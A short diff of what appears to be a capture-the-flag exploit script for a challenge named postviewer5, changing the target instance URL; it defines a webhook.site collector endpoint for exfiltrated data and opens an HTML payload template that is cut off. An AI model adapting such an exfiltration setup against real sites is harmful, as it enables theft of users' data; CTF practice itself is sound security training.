@@ -1,5 +1,5 @@
 const WEBHOOK = "https://webhook.site/22adc411-5a6c-4d97-87b6-8c2f641bdb6c";
-let URL = "https://sehrxn27-postviewer5-ff.instancer.2025.ctfcompetition.com";
+let URL = "https://6ctmep5m-postviewer5-ff.instancer.2025.ctfcompetition.com/";
 // URL = "http://localhost:1338/";
 
 const PAYLOAD = `<!DOCTYPE html>
